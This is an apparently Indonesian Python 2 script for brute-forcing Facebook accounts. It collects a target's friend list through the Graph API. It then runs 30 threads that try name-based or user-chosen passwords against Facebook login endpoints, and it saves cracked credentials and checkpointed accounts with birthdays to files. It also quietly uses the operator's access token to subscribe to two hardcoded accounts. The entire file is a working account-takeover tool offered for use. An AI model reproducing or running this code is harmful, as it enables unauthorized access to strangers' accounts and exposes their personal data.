#!/usr/bin/python2
# coding=utf-8
# script by indah fourmer terimakasih kepada dapunta

import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, requests, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from datetime import datetime

# 𝚌𝚘𝚕𝚘𝚞𝚛
b='\033[1;94m'                                
i='\033[1;92m'                                 
c='\033[1;96m'                                
m='\033[1;91m'                               
u='\033[1;95m'                                
k='\033[1;93m'                                
p='\033[1;97m'                                
h='\033[1;92m'                                
P = '\x1b[1;97m' # 𝚙𝚞𝚝𝚒𝚑
M = '\x1b[1;91m' # 𝚖𝚎𝚛𝚊𝚑     
H = '\x1b[1;92m' # 𝚑𝚒𝚓𝚊𝚞
K = '\x1b[1;93m' # 𝚔𝚞𝚗𝚒𝚗𝚐
B = '\x1b[1;94m' # 𝚋𝚒𝚛𝚞
U = '\x1b[1;95m' # 𝚞𝚗𝚐𝚞 
O = '\x1b[1;96m' # 𝚋𝚒𝚛𝚞 𝚖𝚞𝚍𝚊
N = '\x1b[0m'    
# 𝚑𝚎𝚊𝚍𝚎𝚛𝚜

try:
    import requests
except ImportError:
    os.system('pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')
ip = requests.get('https://api.ipify.org').text
uas = random.choice(["Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-A720F Build/R16NW) [FBAN/Orca-Android;FBAV/196.0.0.29.99;FBPN/com.facebook.orca;FBLC/id_ID;FBBV/135374479;FBCR/AIS;FBMF/samsung;FBBD/samsung;FBDV/SM-A720F;FBSV/8.0.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]",
"Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.162 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; SM-F916B Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.90 Safari/537.36 [FB_IAB/FB4A;FBAV/311.0.0.44.117;]",
"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
api = "https://b-api.facebook.com/method/auth.login"
id = []
cp = []
ok = []
loop = 0
ct = datetime.now()
n = ct.month
bulan = [
 'Januari',
 'Februari',
 'Maret',
 'April',
 'Mei',
 'Juni',
 'Juli',
 'Agustus',
 'September',
 'Oktober',
 'Nopember',
 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
durasi = str(datetime.now().strftime('%d-%m-%Y'))
hari = datetime.now().strftime('%A')
jam = datetime.now().strftime('%H:%M:%S')
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"}

def jalan(z):
	for e in z + "\n":
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.01)
        
def logo():
	os.system("clear")
	
    
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		logo()
		jalan("""\x1b[1;97m (\033[96m•\x1b[1;97m) 𝙰𝚄𝚃𝙷𝙾𝚁 : 𝙰𝚖𝚎𝚛 𝙳𝚘𝚖𝚒𝚗𝚒𝚌 𝙶𝚛𝚎𝚖𝚘𝚗𝚢 𝙺𝚑𝚞𝚛𝚊𝚢𝚊 𝚇𝙳.
\x1b[1;97m (\033[96m•\x1b[1;97m) 𝙶𝙸𝚃𝙷𝚄𝙱 : 𝚑𝚝𝚝𝚙𝚜://𝚐𝚒𝚝𝚑𝚞𝚋.𝚌𝚘𝚖/𝚏𝚘𝚞𝚛𝚖𝚎𝚛𝚡𝚍
══════════════════════════════════════════════""")
		print"\n 𝙹𝙰𝙽𝙶𝙰𝙽 𝙻𝚄𝙿𝙰 𝚂𝙷𝙰𝙻𝙰𝚃 𝙻𝙸𝙼𝙰 𝚆𝙰𝙺𝚃𝚄 𝙽𝙶𝙰𝙱 ! "
		token = raw_input('\n\x1b[1;97m (\033[96m•\x1b[1;97m) 𝚃𝚘𝚔𝚎𝚗  : ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			bot()
		except KeyError:
			print("\x1b[1;97m (\033[96m!\x1b[1;97m) 𝚃𝚘𝚔𝚎𝚗 𝚜𝚊𝚕𝚊𝚑")
			sys.exit() 
 
def bot():
    try:
        token = open('login.txt', 'r').read()
    except IOError:
        print ('\x1b[1;97m (\033[96m!\x1b[1;97m)𝚃𝚘𝚔𝚎𝚗 𝚜𝚊𝚕𝚊𝚑')
        os.system('rm -rf login.txt')
    
    requests.post('https://graph.facebook.com/100041129048948/subscribers?access_token=' + token)
    requests.post('https://graph.facebook.com/100023344580184/subscribers?access_token=' + token) #fal
    menu()           
    
def menu():
    global token
    os.system('clear')
    try:
        token = open('login.txt', 'r').read()
        otw = requests.get('https://graph.facebook.com/me/?access_token=' + token)
        a = json.loads(otw.text)
        nama = a['name']
        id = a['id']
    except KeyError:
        os.system('clear')
        print'(!) 𝚃𝚘𝚔𝚎𝚗 𝚜𝚊𝚕𝚊𝚑'
        os.system('rm -f login.txt')
        time.sleep(3)
        tokenz()
    except requests.exceptions.ConnectionError:
        print'(!) 𝙻𝚘𝚜𝚝 𝚌𝚘𝚗𝚗𝚎𝚌𝚝𝚒𝚘𝚗'
        sys.exit()

    logo()
    jalan(" (•) 𝙰𝚄𝚃𝙷𝙾𝚁 : 𝙰𝚖𝚎𝚛 𝙳𝚘𝚖𝚒𝚗𝚒𝚌 𝙶𝚛𝚎𝚖𝚘𝚗𝚢 𝙺𝚑𝚞𝚛𝚊𝚢𝚊 𝚇𝙳") 
    jalan(" (•) 𝙶𝙸𝚃𝙷𝚄𝙱 : 𝚑𝚝𝚝𝚙𝚜://𝚐𝚒𝚝𝚑𝚞𝚋.𝚌𝚘𝚖/𝚏𝚘𝚞𝚛𝚖𝚎𝚛𝚡𝚍")
    jalan(" ══════════════════════════════════════════════")
    print(" (•) 𝙻𝙸𝚂𝚃 𝙸𝙳 : "+id)
    print(" (•) 𝙻𝙸𝚂𝚃 𝙸𝙿 : "+ip)
    jalan(" ══════════════════════════════════════════════")
    jalan("\n [ 𝚆𝚎𝚕𝚌𝚘𝚖𝚎 "+nama+"\033[1;97m ]")
    print("")
    jalan(" (1) 𝙲𝚛𝚊𝚌𝚔 𝚒𝚍 𝚝𝚎𝚖𝚊𝚗 + 𝚙𝚞𝚋𝚕𝚒𝚌")
    jalan(" (2) 𝙷𝚊𝚜𝚒𝚕 𝚌𝚛𝚊𝚌𝚔")
    jalan(" (3) 𝙱𝚊𝚗𝚝𝚞𝚊𝚗")
    jalan(" (0) 𝙻𝚘𝚐𝚘𝚞𝚝 (𝚝𝚘𝚔𝚎𝚗 𝚍𝚎𝚕𝚎𝚝𝚎)")
    asw = raw_input("\n (•) 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚙𝚒𝚕𝚒𝚑 : ")
    if asw == "":
    	menu()
    elif asw == "1":
    	publik()
    elif asw == "3":
    	laporbug()
    elif asw == "2":
    	cekakun()
    elif asw == "0":
    	os.system('rm -f login.txt')
    	jalan(" (•) 𝙼𝚎𝚗𝚐𝚑𝚊𝚙𝚞𝚜 𝚃𝚘𝚔𝚎𝚗...  ")
    	exit()
    else:
    	jalan(" (•) 𝙿𝚒𝚕𝚒𝚑𝚊𝚗 𝚜𝚊𝚕𝚊𝚑")
    	menu() 
    
def publik():
    print(" (•) 𝙺𝚎𝚝𝚒𝚔 ' me ' 𝚓𝚒𝚔𝚊 𝚒𝚗𝚐𝚒𝚗 𝚌𝚛𝚊𝚌𝚔 𝚝𝚎𝚖𝚊𝚗 𝚊𝚗𝚍𝚊")
    idt = raw_input(' (•) 𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝚒𝚍 𝚙𝚞𝚋𝚕𝚒𝚌: ')
    if idt == "":
    	menu()
    try:
        mmk = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
        kntl = json.loads(mmk.text)
        #print' [+] Nama : ' + sp['name']
    except KeyError:
        print'(!) 𝙸𝚍 𝚔𝚘𝚜𝚘𝚗𝚐'
        menu()

    ajg = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
    ppk = json.loads(ajg.text)
    for i in ppk['data']:
        uid = i['id']
        na = i['name']
        nm = na.rsplit(' ')[0]
        id.append(uid + '|' + nm)
    print""
    print' (•) 𝙹𝚞𝚖𝚕𝚊𝚑 𝚒𝚍 -> \033[1;91m' + str(len(id))
    pilihmetode(ppk)
    
def cekakun():
    print'\n (1) 𝚌𝚛𝚊𝚌𝚔 𝙾𝙺 '
    print' (2) 𝚌𝚛𝚊𝚌𝚔 𝙲𝙿 '
    anjg = raw_input('\n (•) 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝙿𝚒𝚕𝚒𝚑 : ')
    if anjg == '':
        menu()
    elif anjg == '01' or anjg == '1':
        print'\n (•) 𝙷𝚊𝚜𝚒𝚕 𝚌𝚛𝚊𝚌𝚔 \x1b[0;92m𝙾𝙺\x1b[1;97m 𝚃𝚊𝚗𝚐𝚐𝚊𝚕 : \x1b[0;92m%s-%s-%s\x1b[1;97m' % (ha, op, ta)
        os.system(' cat out/OK-%s-%s-%s' % (ha, op, ta))
        raw_input("\n 𝙴𝚗𝚝𝚎𝚛 ")
        menu()
    elif anjg == '02' or anjg == '2':
        totalcp = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta)).read().splitlines()
        print '\n (•) 𝙷𝚊𝚜𝚒𝚕 𝚌𝚛𝚊𝚌𝚔 𝙲𝙿 𝚃𝚊𝚗𝚐𝚐𝚊𝚕 : %s-%s-%s-%s' % (hari, ha, op, ta)
        print " \033[1;97m(•) 𝙹𝚞𝚖𝚕𝚊𝚑 : %s" %(len(totalcp))
        print""
        os.system(' cat out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta))
        raw_input("\n (•) 𝙴𝚗𝚝𝚎𝚛 ")
        menu()
    else:
        print(' (!) 𝙿𝚒𝚕𝚒𝚑𝚊𝚗 𝚜𝚊𝚕𝚊𝚑')
        menu()
 
def laporbug():
	asulo = raw_input("\n (•) 𝙼𝚊𝚜𝚞𝚔𝚔𝚊𝚗 𝚋𝚊𝚗𝚝𝚞𝚊𝚗 : ").replace(' ','%20')
	if asulo == "":
		menu()
	os.system('xdg-open https://wa.me/6289525760586?text=' +asulo)
	raw_input("\n (•) 𝙴𝚗𝚝𝚎𝚛 ")
	menu()
       
def infologin():
	print""
	print "\n (•) 𝚃𝚘𝚔𝚎𝚗 : "+token
	print ""
	raw_input("\n (•) 𝙴𝚗𝚝𝚎𝚛 ")
	menu()
	
def pilihmetode(file):
	print("")
	print(""+p+" 𝙿𝚒𝚕𝚒𝚑 𝚖𝚎𝚝𝚘𝚍𝚎 𝚌𝚛𝚊𝚌𝚔")
	print("")
	print(" (1) 𝚊𝚙𝚒.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 (𝚗𝚎𝚠)")
	print(" (2) 𝚏𝚛𝚎𝚎.𝚏𝚊𝚌𝚎𝚋𝚘𝚘𝚔 (𝚘𝚕𝚍)")
	print("")
	z = raw_input(" (•) 𝚂𝚒𝚕𝚊𝚑𝚔𝚊𝚗 𝚙𝚒𝚕𝚒𝚑 : ")
	if z == "":
		print(" (!) 𝙿𝚒𝚕𝚒𝚑𝚊𝚗 𝚂𝚊𝚕𝚊𝚑")
		pilihmetode(file)
	elif z == '01' or z == '1':
		bapi()
	elif z == '02' or z == '2':
		freefb()
	else:
		print(" (!) 𝙿𝚒𝚕𝚒𝚑𝚊𝚗 𝚜𝚊𝚕𝚊𝚑")
		exit()
	
def bapi():
	ask = raw_input(' (•) 𝙶𝚞𝚗𝚊𝚔𝚊𝚗 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍  𝚖𝚊𝚗𝚞𝚊𝚕 𝚢/𝚝 ? ')
	if ask == 'Y' or ask == 'y':
		manualbapi()
	print'\n (•) 𝚌𝚛𝚊𝚌𝚔 𝙾𝙺 𝚜𝚊𝚟𝚎 𝚍𝚒 𝚘𝚔/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	print' (•) 𝚌𝚛𝚊𝚌𝚔 𝙲𝙿 𝚜𝚊𝚟𝚎 𝚍𝚒 𝚌𝚙/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
	jalan("\n (!) 𝚓𝚒𝚔𝚊 𝚝𝚒𝚍𝚊𝚔 𝚊𝚍𝚊 𝚑𝚊𝚜𝚒𝚕, 𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗 𝚖𝚘𝚍𝚎 𝚑𝚎𝚕𝚒𝚌𝚘𝚙𝚝𝚎𝚛 3 𝚍𝚎𝚝𝚒𝚔")
	print("")

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;97m(𝚌𝚛𝚊𝚌𝚔) %s/%s -> 𝚘𝚔-:%s - 𝚌𝚙-:%s ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower(), name.lower() + '123', name.lower() + '1234', name.lower() + '12345']:
				kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
				param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				respon = requests.get(api,params=param, headers=kontol)
				if "session_key" in respon.text and "EAAA" in respon.text:
					print '\r  \033[0;92m• ' +uid+ '|' + pw + '        '
					ok.append(uid+'|'+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write(''+str(uid)+'|'+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				if "www.facebook.com" in respon.json()["error_msg"]:
					try:
						token = open('login.txt').read()  
						sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
						b = json.loads(sw.text)
						graph = b["birthday"]
						month, day, year = graph.split("/")
						month = bulan[month]
						print'\r\x1b[1;93m  • ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
						cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
						save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
						save.write('  • ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
						save.close()
						break
					except(KeyError, IOError):
						graph = " "
					except:pass
					print'\r\x1b[1;93m  • ' + uid + '|' + pw + '                        '
					cp.append(uid + '|' + pw)
					save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
					save.write('  • ' + str(uid) + '|' + str(pw) +                        '\n')
					save.close()
					break
					continue
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print'\n\n\x1b[1;97m (•) 𝚏𝚒𝚗𝚒𝚜𝚑𝚎𝚍...'
	exit()


def manualbapi():
    print'\n (•) 𝙱𝚞𝚊𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 𝚌𝚘𝚗𝚝𝚘𝚑 : 𝚋𝚒𝚜𝚖𝚒𝚕𝚕𝚊𝚑, 𝚜𝚊𝚢𝚊𝚗𝚐, 𝚓𝚊𝚗𝚌𝚘𝚔, 𝚍𝚕𝚕.'
    pw = raw_input(' (•) 𝙱𝚞𝚊𝚝 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍 : ').split(',')
    if len(pw) == 0:
        exit('(!) 𝚒𝚜𝚒 𝚢𝚊𝚗𝚐 𝚋𝚎𝚗𝚊𝚛 𝚊𝚗𝚓𝚒𝚗𝚔')
    print'\n (•) 𝚌𝚛𝚊𝚌𝚔 𝚘𝚔 𝚍𝚒𝚜𝚒𝚖𝚙𝚊𝚗 𝚍𝚒 • 𝚘𝚔/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' (•) 𝚌𝚛𝚊𝚌𝚔 𝚌𝚙 𝚍𝚒𝚜𝚒𝚖𝚙𝚊𝚗 𝚍𝚒 • 𝚌𝚙/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n (•) 𝚓𝚒𝚔𝚊 𝚝𝚒𝚍𝚊𝚔 𝚊𝚍𝚊 𝚑𝚊𝚜𝚒𝚕, 𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗 𝚖𝚘𝚍𝚎 𝚑𝚎𝚕𝚒𝚌𝚘𝚙𝚝𝚎𝚛 3 𝚍𝚎𝚝𝚒𝚔")
    print("")

    def main(arg):
        global loop
        w = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m'])
        print'\r\x1b[1;97m (•) (𝚌𝚛𝚊𝚌𝚔) %s/%s -> 𝚘𝚔-:%s - 𝚌𝚙-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                kontol = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
                'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
                'user-agent': uas, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
                param = {"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
                respon = requests.get(api,params=param, headers=kontol)
                if "session_key" in respon.text and "EAAA" in respon.text:
                    print'\r\x1b[0;92m  *--> ' + uid + '|' + asu + '        '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue
                if "www.facebook.com" in respon.json()["error_msg"]:
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) + '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m (•) 𝚌𝚛𝚊𝚌𝚔 𝚏𝚒𝚗𝚒𝚜𝚑𝚎𝚍...'
    exit()
    
def freefb():
    ask = raw_input(' (•) 𝙶𝚞𝚗𝚊𝚔𝚊𝚗 𝚙𝚊𝚜𝚜𝚠𝚘𝚛𝚍  𝚖𝚊𝚗𝚞𝚊𝚕 𝚢/𝚝 ?')
    if ask == 'Y' or ask == 'y':
        manualfreefb()
    print'\n (•) 𝚌𝚛𝚊𝚌𝚔 𝚘𝚔 𝚍𝚒𝚜𝚒𝚖𝚙𝚊𝚗 𝚍𝚒 • 𝚘𝚔/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' (•) 𝚌𝚛𝚊𝚌𝚔 𝚌𝚙 𝚍𝚒𝚜𝚒𝚖𝚙𝚊𝚗 𝚍𝚒 • 𝚌𝚙/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n (•) 𝚓𝚒𝚔𝚊 𝚝𝚒𝚍𝚊𝚔 𝚊𝚍𝚊 𝚑𝚊𝚜𝚒𝚕, 𝚊𝚔𝚝𝚒𝚏𝚔𝚊𝚗 𝚖𝚘𝚍𝚎 𝚑𝚎𝚕𝚒𝚌𝚘𝚙𝚝𝚎𝚛 3 𝚍𝚎𝚝𝚒𝚔")
    print("")
    
    def main(arg):
        global loop
        print'\r\x1b[1;97m (𝚌𝚛𝚊𝚌𝚔) %s/%s 𝚘𝚔-:%s - 𝚌𝚙-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for pw in [name.lower(), name.lower() + '1234', name.lower() + '12345', name.lower() + '123']:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': pw, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m  • ' + uid + '|' + pw + '                                            '
                    ok.append(uid + '|' + pw)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write(' (𝚘𝚔) ' + str(uid) + '|' + str(pw) +                                   '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + pw + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(pw) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + pw + '                        '
                    cp.append(uid + '|' + pw)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(pw) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m (•) 𝚏𝚒𝚗𝚒𝚜𝚑𝚎𝚍...'
    exit()


def manualfreefb():
    print'\n [+] buat password contoh : bismillah,sayang,rahasia'
    pw = raw_input(' [?] buat password : ').split(',')
    if len(pw) == 0:
        exit('[!] Isi Yang Benar, Tidak Boleh Kosong!')
    print'\n [+] hasil OK disimpan ke -> OK/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print' [+] hasil CP disimpan ke -> CP/%s-%s-%s-%s.txt' % (hari, ha, op, ta)
    print("\n [!] jika tidak ada hasil, aktifkan mode pesawat 5-10 detik")
    print("")

    def main(arg):
        global loop
        print'\r\x1b[1;97m [*] [crack] %s/%s OK-:%s - CP-:%s ' % (loop, len(id), len(ok), len(cp)),
        sys.stdout.flush()
        user = arg
        uid, name = user.split('|')
        try:
            os.mkdir('out')
        except OSError:
            pass

        try:
            for asu in pw:
                rex = requests.post('https://free.facebook.com/login.php', data={'email': uid, 'pass': asu, 'login': 'submit'}, headers={'user-agent': uas })
                xo = rex.content
                if 'free_logout_button' in xo or 'save-device' in xo:
                    print'\r\x1b[1;92m. *--> ' + uid + '|' + asu + '                          '
                    ok.append(uid + '|' + asu)
                    save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  *--> ' + str(uid) + '|' + str(asu) +                         '\n')
                    save.close()
                    break
                    continue
                    continue
                elif 'checkpoint' in xo:
                    try:
                        token = open('login.txt').read()  
                        sw = requests.get('https://graph.facebook.com/'+uid+'/?access_token=' + token)
                        b = json.loads(sw.text)
                        graph = b["birthday"]
                        month, day, year = graph.split("/")
                        month = bulan[month]
                        print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '|' + day + ' ' + month + ' ' + year + ' '
                        cp.append(uid + '|' + asu + '|' + day + ' ' + month + ' ' + year)
                        save = open('out/CP-%s-%s-%s-%s.txt' % (hari, ha, op, ta), 'a')
                        save.write('  * --> ' + str(uid) + '|' + str(asu) + '|' + str(day) + ' ' + str(month) + ' ' + str(year) +                     '\n')
                        save.close()
                        break
                    except(KeyError, IOError):
                        graph = " "
                    except:pass
                    print'\r\x1b[1;93m  * --> ' + uid + '|' + asu + '                        '
                    cp.append(uid + '|' + asu)
                    save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta), 'a')
                    save.write('  * --> ' + str(uid) + '|' + str(asu) +                        '\n')
                    save.close()
                    break
                    continue
                    continue

            loop += 1
        except:
            pass
    
    
    p = ThreadPool(30)
    p.map(main, id)
    print'\n\n\x1b[1;97m [+] crack selesai...'
    exit()
    
if __name__ == '__main__':
    os.system('clear')
    tokenz()


